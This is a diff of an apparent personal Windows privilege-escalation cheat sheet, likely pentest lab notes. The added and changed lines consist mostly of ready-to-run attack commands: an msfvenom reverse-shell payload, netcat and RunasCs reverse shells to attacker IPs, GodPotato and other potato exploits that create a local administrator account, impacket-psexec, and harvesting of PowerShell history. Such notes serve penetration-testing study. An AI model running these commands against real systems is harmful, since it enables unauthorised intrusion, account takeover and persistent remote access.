@@ -35,6 +35,9 @@ Host file -`C:\Windows\System32\drivers\etc\hosts`
 powershell -ep bypass
 . .\Downloads\PowerView.ps1
 
+Powershell history at: (for each user)
+cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline
+
 systeminfo - (look for latest hotfixes patched)
 wmic qfe - check patch history (wmi - windows management instrumentation command line quick fix engineering)
 wmic logicaldisk get caption,description,providername
@@ -77,6 +80,7 @@ Adding powershell and cmd to PATH, some commands like whoami may not work withou
 2. nc64.exe best run via cmd or powershell first (eg. cmd.exe /c nc64.exe ...)
 For service overwriting
 3. msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=1338 -f exe -o rev.exe
+4. if WebDAV enabled -> cadaver $ip [provide creds] and ftp style put revshell
 ```
 
 ### User & Network Enumeration
@@ -177,18 +181,22 @@ icacls - ACL to files/directories [Confirm our write perms on that directory]
 
 {% embed url="https://kashish.gitbook.io/7/master/windows-privesc/unquoted-service-path" %}
 
+{% embed url="https://juggernaut-sec.com/weak-service-file-permissions/#PowerUp" %}
+
 ```
 shutdown -r -t 1 [time interval and reboot flags]
 ```
 
-#### Scheduled Tasks
+#### Scheduled Tasks aka Cronjobs
 
 ```
 [CMD] schtasks
 [PS] Get-ScheduledTask
 ```
 
-{% code title="Check recently created processes" %}
+**PSPY Equivalent - just won't know which user is running it**
+
+{% code title="Check recently created processes " %}
 ```
 wmic process get Name,ProcessId,CreationDate
 ```
@@ -203,6 +211,12 @@ payload for service c file and DLL file
 {% embed url="https://sirensecurity.io/blog/dllref/" %}
 Locations of standard DLL files used in Windows
 {% endembed %}
+
+{% embed url="https://juggernaut-sec.com/dll-hijacking/" %}
+
+{% hint style="info" %}
+Access \[PG AD]
+{% endhint %}
 
 ## Token Impersonation
 
@@ -233,7 +247,16 @@ Check .NET version for GodPotato, does not miss at all just don't go for a revsh
 reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
 ```
 
-* GodPotato  - `.\GP.exe -cmd "net user jtrip jtrip /add & net localgroup administrators jtrip /add"`
+* GodPotato &#x20;
+
+```
+.\GP.exe -cmd "net user /add jtrip jtrip"
+.\GP.exe -cmd "net localgroup administrators jtrip /add"
+.\RunasCs.exe "jtrip" 'jtrip' powershell.exe -r 192.168.45.187:9001
+OR
+impacket-psexec jtrip:jtrip@192.168.202.249 cmd.exe
+```
+
 * PrintSpoofer - .`\PrintSpoofer.exe -i -c cmd`
 * SweetPotato - `.\SweetPotato.exe -e EfsRpc -p C:\programdata\nc.exe -a "192.168.45.205 1234 -e cmd"`
 
@@ -245,7 +268,7 @@ Get-Service Spooler
 
 If you really need it tho
 
-`.\GodPotato-NET4.exe -cmd "cmd /c C:\programdata\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.205 8001"`
+`.\GP.exe -cmd "cmd /c C:\programdata\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.205 8001"`
 
 {% embed url="https://jlajara.gitlab.io/Potatoes_Windows_Privesc" %}
 Explain how each potato works
@@ -327,7 +350,7 @@ $documents.MoveHere($item)
 
 dnSpy the GOAT
 
-<div align="left"><figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure></div>
+<div align="left"><figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure></div>
 
 ## Kernel Exploits
 
